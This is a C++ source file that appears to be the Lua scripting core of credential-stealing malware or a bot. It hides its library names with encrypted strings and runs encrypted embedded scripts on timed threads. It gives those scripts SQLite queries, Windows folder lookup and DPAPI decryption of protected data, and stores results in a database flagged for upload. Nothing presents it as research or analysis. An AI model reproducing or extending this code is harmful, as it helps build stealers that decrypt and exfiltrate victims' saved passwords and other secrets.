#include "stdafx.h"
#include "scriptmodule.h"
#include "cryptedscripts.h"
#include "cryptedstrings.h"
#include "string.h"
#include "sqlite3.h"
#include "infodatabase.h"
#include "kernel.h"
#include "debug.h"
#include "bzprotocol.h"
#include "threadsgroup.h"
#include "defines.h"

#include "../include/lua.h"
#include "../include/lauxlib.h"
#include "../include/lualib.h"

static lua_State* luaStateGeneric;
static ThreadsGroup::GROUP scriptsGroup;

#pragma region l_bzplib

static int l_bzp_validate(lua_State * luaState)
{
	if (!lua_isstring(luaState, 1))
	{
		CSTRA(error_str, lua_error_bad_signature);
		lua_pushstring(luaState, error_str);
		lua_error(luaState);
	}
	else
	{
		std::string url(lua_tostring(luaState, 1));
		lua_pushinteger(luaState, BzProtocol::validateHost(std::wstring(url.begin(), url.end()).c_str()));
	}
	return 1;
}

LPSTR bzplib_name;

luaL_Reg bzplib_funcs[] = {
	{ NULL, l_bzp_validate },
	{ NULL, NULL }
};

void init_bzplib()
{
	bzplib_name = new char[CryptedStrings::len_lua_lib_bzp];
	CryptedStrings::_getA(CryptedStrings::id_lua_lib_bzp, bzplib_name);

	bzplib_funcs[0].name = new char[CryptedStrings::len_lua_lib_bzp_validate];
	CryptedStrings::_getA(CryptedStrings::id_lua_lib_bzp_validate, (char *)bzplib_funcs[0].name);
}

void uninit_bzplib()
{
	delete bzplib_name;
	delete bzplib_funcs[0].name;
}

int luaopen_bzplib(lua_State * L)
{
	luaL_newlib(L, bzplib_funcs);
	return 1;
}

#pragma endregion

#pragma region d2

static int l_d2_ls(lua_State * luaState)
{
	lua_pushlstring(luaState, c_loadingScreen, std::extent<decltype(c_loadingScreen)>::value);
	return 1;
}

static int l_d2_ca(lua_State * luaState)
{
	lua_pushlstring(luaState, c_classAlias, std::extent<decltype(c_classAlias)>::value);
	return 1;
}

LPSTR d2lib_name = "d2";

luaL_Reg d2lib_funcs[] = {
	{ "ls", l_d2_ls },
	{ "ca", l_d2_ca },
	{ NULL, NULL }
};

int luaopen_d2lib(lua_State * L)
{
	luaL_newlib(L, d2lib_funcs);
	return 1;
}

#pragma endregion

#pragma region l_databaselib

static int l_database_add(lua_State * luaState)
{
	if (!lua_isinteger(luaState, 1) || !lua_isinteger(luaState, 2) || !lua_isstring(luaState, 3))
	{
		CSTRA(error_str, lua_error_bad_signature);
		lua_pushstring(luaState, error_str);
		lua_error(luaState);
	}
	else
	{
		size_t len;
		const char * buffer = lua_tolstring(luaState, 3, &len);
		bool result = InfoDatabase::addItem(&kernelData.database, (unsigned int)lua_tointeger(luaState, 1), len, (unsigned int)lua_tointeger(luaState, 2), buffer);
		lua_pushboolean(luaState, result);
	}
	return 1;
}

LPSTR databaselib_name;

luaL_Reg databaselib_funcs[] = {
	{ NULL, l_database_add },
	{ NULL, NULL }
};

void init_databaselib()
{
	databaselib_name = new char[CryptedStrings::len_lua_lib_database];
	CryptedStrings::_getA(CryptedStrings::id_lua_lib_database, databaselib_name);

	databaselib_funcs[0].name = new char[CryptedStrings::len_lua_lib_database_add];
	CryptedStrings::_getA(CryptedStrings::id_lua_lib_database_add, (char *)databaselib_funcs[0].name);
}

void uninit_databaselib()
{
	delete databaselib_name;
	delete databaselib_funcs[0].name;
}

int luaopen_databaselib(lua_State * L)
{
	luaL_newlib(L, databaselib_funcs);
	return 1;
}


#pragma endregion

#pragma region l_sqlite3lib

static int l_sqlite3_open(lua_State * luaState)
{
	if (!lua_isstring(luaState, 1))
	{
		CSTRA(error_str, lua_error_bad_signature);
		lua_pushstring(luaState, error_str);
		lua_error(luaState);
	}
	else
	{
		sqlite3 *db;
		if (sqlite3_open(lua_tostring(luaState, 1), &db) != SQLITE_OK && db != NULL)
		{
			sqlite3_close(db);
			lua_pushstring(luaState, sqlite3_errmsg(db));
			lua_error(luaState);
		}
		else
		{
			lua_pushlightuserdata(luaState, db);
		}
	}
	return 1;
}

static int l_sqlite3_gettable(lua_State * luaState)
{
	if (!lua_islightuserdata(luaState, 1) || !lua_isstring(luaState, 2))
	{
		CSTRA(error_str, lua_error_bad_signature);
		lua_pushstring(luaState, error_str);
		lua_error(luaState);
	}
	else
	{
		sqlite3 *db = (sqlite3*)lua_topointer(luaState, 1);
		char *error_str = NULL;
		int pnRow;
		int pnColumn;
		char **pazResult;

		if (sqlite3_get_table(db, lua_tostring(luaState, 2), &pazResult, &pnRow, &pnColumn, &error_str) != SQLITE_OK)
		{
			lua_pushstring(luaState, error_str);
			lua_error(luaState);
			sqlite3_free_table(pazResult);
		}
		else
		{
			for (int c = 0; c < pnColumn;c++)
			{
				lua_newtable(luaState);
				for (int r = 0; r < pnRow; r++)
				{
					lua_pushstring(luaState, pazResult[pnColumn + pnColumn * r + c]);
					lua_rawseti(luaState, -2, r);
				}
			}
			sqlite3_free_table(pazResult);
			return pnColumn;
		}
	}
	return 1;
}

static int l_sqlite3_close(lua_State * luaState)
{
	if (!lua_islightuserdata(luaState, 1))
	{
		CSTRA(error_str, lua_error_bad_signature);
		lua_pushstring(luaState, error_str);
		lua_error(luaState);
	}
	else
	{
		sqlite3 *db = (sqlite3*)lua_topointer(luaState, 1);
		sqlite3_close(db);
	}
	return 0;
}

LPSTR sqlite3lib_name;

luaL_Reg sqlite3lib_funcs[] = {
	{ NULL, l_sqlite3_open },
	{ NULL, l_sqlite3_gettable },
	{ NULL, l_sqlite3_close },
	{ NULL, NULL }
};

void init_sqlite3lib()
{
	sqlite3lib_name = new char[CryptedStrings::len_lua_lib_sqlite3];
	CryptedStrings::_getA(CryptedStrings::id_lua_lib_sqlite3, sqlite3lib_name);

	sqlite3lib_funcs[0].name = new char[CryptedStrings::len_lua_lib_sqlite3_open];
	CryptedStrings::_getA(CryptedStrings::id_lua_lib_sqlite3_open, (char *)sqlite3lib_funcs[0].name);
	sqlite3lib_funcs[1].name = new char[CryptedStrings::len_lua_lib_sqlite3_gettable];
	CryptedStrings::_getA(CryptedStrings::id_lua_lib_sqlite3_gettable, (char *)sqlite3lib_funcs[1].name);
	sqlite3lib_funcs[2].name = new char[CryptedStrings::len_lua_lib_sqlite3_close];
	CryptedStrings::_getA(CryptedStrings::id_lua_lib_sqlite3_close, (char *)sqlite3lib_funcs[2].name);
}

void uninit_sqlite3lib()
{
	delete sqlite3lib_name;
	delete sqlite3lib_funcs[0].name;
	delete sqlite3lib_funcs[1].name;
	delete sqlite3lib_funcs[2].name;
}

int luaopen_sqlite3lib(lua_State * L)
{
	luaL_newlib(L, sqlite3lib_funcs);
	return 1;
}

#pragma endregion

#pragma region l_windowslib

static int l_windows_getfolder(lua_State * luaState)
{
	if (!lua_isnumber(luaState, 1))
	{
		CSTRA(error_str, lua_error_bad_signature);
		lua_pushstring(luaState, error_str);
		lua_error(luaState);
	}
	else
	{
		WCHAR path[MAX_PATH];
		if (SHGetFolderPathW(NULL, (int)lua_tointeger(luaState, 1), NULL, SHGFP_TYPE_CURRENT, path) != S_OK)
		{
			CSTRA(error_str, lua_error_system);
			lua_pushstring(luaState, error_str);
			lua_error(luaState);
		}
		else  
		{
			char pathA[MAX_PATH];
			PathRemoveBackslashW(path);
			String::_unicodeToAnsi(path, String::_LengthW(path), pathA, MAX_PATH);
			lua_pushstring(luaState, pathA);
		}
	}
	return 1;
}

static int l_windows_messagebox(lua_State * luaState)
{
	if (!lua_isstring(luaState, 1) || !lua_isstring(luaState, 2) || !lua_isnumber(luaState, 3))
	{
		CSTRA(error_str, lua_error_bad_signature);
		lua_pushstring(luaState, error_str);
		lua_error(luaState);
	}
	else
	{
		LPCSTR textA = lua_tostring(luaState, 1);
		LPCSTR captionA = lua_tostring(luaState, 2);
		LPCWSTR text = String::_ansiToUnicodeEx((LPSTR)textA, strlen(textA));
		LPCWSTR caption = String::_ansiToUnicodeEx((LPSTR)captionA, strlen(textA));
		
		int result = MessageBox(NULL, text, caption, (UINT)lua_tointeger(luaState, 3));

		free((void*)text);
		free((void*)caption);
	}
	return 1;
}

static int l_windows_cryptunprotecthexdata(lua_State * luaState)
{
	if (!lua_isstring(luaState, 1))
	{
		CSTRA(error_str, lua_error_bad_signature);
		lua_pushstring(luaState, error_str);
		lua_error(luaState);
	}
	else
	{
		LPCSTR hexA = lua_tostring(luaState, 1);
		LPCWSTR hex = String::_ansiToUnicodeEx((LPSTR)hexA, strlen(hexA));

		if (strlen(hexA) % 2 != 0)
		{
			CSTRA(error_str, lua_error_system);
			lua_pushstring(luaState, error_str);
			lua_error(luaState);
		}
		else
		{
			BYTE * crypted = new BYTE[strlen(hexA) / 2 + 1];
			DWORD size;
			CryptStringToBinary(hex, NULL, CRYPT_STRING_HEX, crypted, &size, NULL, NULL);
			
			DATA_BLOB DataIn;
			DATA_BLOB DataOut;

			DataIn.cbData = size;
			DataIn.pbData = crypted;

			if (!CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, CRYPTPROTECT_UI_FORBIDDEN, &DataOut))
			{
				CSTRA(error_str, lua_error_system);
				lua_pushstring(luaState, error_str);
				lua_error(luaState);
			}
			else
			{
				char * decrypted = new char[DataOut.cbData + 1];
				CopyMemory(decrypted, DataOut.pbData, DataOut.cbData);
				decrypted[DataOut.cbData] = NULL;
				lua_pushstring(luaState, decrypted);
				delete decrypted;
			}
			delete crypted;
			free((void*)hex);
		}
	}
	return 1;
}

LPSTR windowslib_name;

luaL_Reg windowslib_funcs[] = {
	{ NULL, l_windows_messagebox },
	{ NULL, l_windows_getfolder },
	{ NULL, l_windows_cryptunprotecthexdata },
	{ NULL, NULL }
};

void init_windowslib()
{
	windowslib_name = new char[CryptedStrings::len_lua_lib_windows];
	CryptedStrings::_getA(CryptedStrings::id_lua_lib_windows, windowslib_name);

	windowslib_funcs[0].name = new char[CryptedStrings::len_lua_lib_windows_messagebox];
	CryptedStrings::_getA(CryptedStrings::id_lua_lib_windows_messagebox, (char *)windowslib_funcs[0].name);
	windowslib_funcs[1].name = new char[CryptedStrings::len_lua_lib_windows_getfolder];
	CryptedStrings::_getA(CryptedStrings::id_lua_lib_windows_getfolder, (char *)windowslib_funcs[1].name);
	windowslib_funcs[2].name = new char[CryptedStrings::len_lua_lib_windows_cryptunprotecthexdata];
	CryptedStrings::_getA(CryptedStrings::id_lua_lib_windows_cryptunprotecthexdata, (char *)windowslib_funcs[2].name);
}

void uninit_windowslib()
{
	delete windowslib_name;
	delete windowslib_funcs[0].name;
	delete windowslib_funcs[1].name;
}

int luaopen_windowslib(lua_State * L)
{	
	luaL_newlib(L, windowslib_funcs);
	return 1;
}

#pragma endregion

static void initState(lua_State * luaState)
{
	luaL_openlibs(luaState);

	luaL_requiref(luaState, windowslib_name, luaopen_windowslib, true);
	luaL_requiref(luaState, sqlite3lib_name, luaopen_sqlite3lib, true);
	luaL_requiref(luaState, databaselib_name, luaopen_databaselib, true);
	luaL_requiref(luaState, bzplib_name, luaopen_bzplib, true);
	luaL_requiref(luaState, d2lib_name, luaopen_d2lib, true);
}

void ScriptModule::init()
{
	init_windowslib();
	init_sqlite3lib();
	init_databaselib();
	init_bzplib();

	luaStateGeneric = luaL_newstate();
	initState(luaStateGeneric);
	
	ThreadsGroup::_createGroup(&scriptsGroup);
}

void ScriptModule::uninit()
{
	uninit_windowslib();
	uninit_sqlite3lib();
	uninit_databaselib();
	uninit_bzplib();
	ThreadsGroup::_closeGroup(&scriptsGroup);
}

BOOL ScriptModule::_executeScript(const char * script, LPVOID * result, BOOL * hasResult)
{
	if(hasResult != NULL) *hasResult = false;
	BOOL scriptResult;
	try
	{
		scriptResult = luaL_dostring(luaStateGeneric, script);
	}
	catch (...)
	{
	}

	if (scriptResult && lua_isstring(luaStateGeneric, -1)) {
		std::string error = std::string("Exception executing script : ").append(lua_tostring(luaStateGeneric, -1));
		InfoDatabase::addItem(&kernelData.database, InfoDatabase::TYPE_LOG_ERROR, error.size(), InfoDatabase::ITEM_FLAG_POP | InfoDatabase::ITEM_FLAG_UPLOAD, error.c_str());
		WDEBUG("Exception in script: " << lua_tostring(luaStateGeneric, -1));
	}

	if (hasResult == NULL || result == NULL) return scriptResult;
	
	if (lua_isstring(luaStateGeneric, -1))
	{
		const char * luaResultString = lua_tostring(luaStateGeneric, -1);
		CHAR * resultString = new CHAR[strlen(luaResultString) + 1];
		strcpy_s(resultString, strlen(luaResultString) + 1,  luaResultString);

		*result = resultString;
		*hasResult = true;
	}
	else if (lua_isinteger(luaStateGeneric, -1))
	{
		int * resultInt = new int((int)lua_tointeger(luaStateGeneric, -1));
		*result = resultInt;
		*hasResult = true;
	}
	lua_settop(luaStateGeneric, 0);
	return scriptResult;
}

static DWORD WINAPI _procScript(void * data)
{
	Sleep(5000);
	lua_State * state = luaL_newstate();
	initState(state);

	ScriptModule::_script_data_t * scriptData = (ScriptModule::_script_data_t *)data;
	while (scriptData->cycle > 0)
	{
		char * script = new char[scriptData->len + 1];
		CryptedScripts::_getScriptA((short)scriptData->id, script);

		if (luaL_dostring(state, script))
		{
			const char * message = lua_tostring(state, -1);
			if (scriptData->log)
			{
				InfoDatabase::addItem(&kernelData.database, InfoDatabase::TYPE_LOG_ERROR, strlen(message), InfoDatabase::ITEM_FLAG_UPLOAD | InfoDatabase::ITEM_FLAG_POP, message);
			}
			WDEBUG("Error lua :" << message);
		}

		delete script;
		//TODO:100%zero memory
		Sleep(scriptData->cycle);
	}
	lua_close(state);
	return 0;
}

void ScriptModule::registerCronScript(DWORD id, DWORD cycle, DWORD len, BOOL log)
{
	_script_data_t * data = (_script_data_t *)malloc(sizeof(_script_data_t));
	data->cycle = cycle;
	data->id = id;
	data->len = len;
	data->log = log;
	ThreadsGroup::_createThread(&scriptsGroup, 0, _procScript, data, NULL, NULL);
}
